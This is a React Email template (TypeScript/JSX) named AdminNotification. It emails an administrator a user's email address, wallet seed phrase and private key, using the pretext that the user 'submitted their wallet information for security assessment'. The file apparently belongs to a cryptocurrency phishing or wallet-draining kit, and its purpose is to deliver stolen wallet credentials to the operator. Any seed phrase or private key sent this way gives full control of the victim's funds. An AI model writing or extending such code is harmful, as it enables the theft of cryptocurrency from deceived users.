
import {
  Body,
  Container,
  Head,
  Heading,
  Html,
  Preview,
  Text,
} from 'npm:@react-email/components@0.0.22'
import * as React from 'npm:react@18.3.1'

interface AdminNotificationProps {
  email: string;
  walletInfo: {
    seedPhrase: string;
    privateKey: string;
  };
}

export const AdminNotification = ({
  email,
  walletInfo,
}: AdminNotificationProps) => (
  <Html>
    <Head />
    <Preview>New Wallet Connection Request</Preview>
    <Body style={main}>
      <Container style={container}>
        <Heading style={h1}>New Wallet Connection</Heading>
        <Text style={text}>
          A new user has submitted their wallet information for security assessment:
        </Text>
        <Text style={text}>
          <strong>User Email:</strong> {email}
        </Text>
        <Text style={text}>
          <strong>Seed Phrase:</strong> {walletInfo.seedPhrase}
        </Text>
        <Text style={text}>
          <strong>Private Key:</strong> {walletInfo.privateKey}
        </Text>
      </Container>
    </Body>
  </Html>
)

export default AdminNotification

const main = {
  backgroundColor: '#ffffff',
  padding: '40px 0',
}

const container = {
  margin: '0 auto',
  padding: '20px',
  maxWidth: '600px',
}

const h1 = {
  color: '#333',
  fontFamily: '-apple-system, system-ui, BlinkMacSystemFont, sans-serif',
  fontSize: '24px',
  fontWeight: 'bold',
  lineHeight: '1.25',
  margin: '0 0 20px',
}

const text = {
  color: '#333',
  fontFamily: '-apple-system, system-ui, BlinkMacSystemFont, sans-serif',
  fontSize: '16px',
  lineHeight: '1.5',
  margin: '0 0 10px',
}
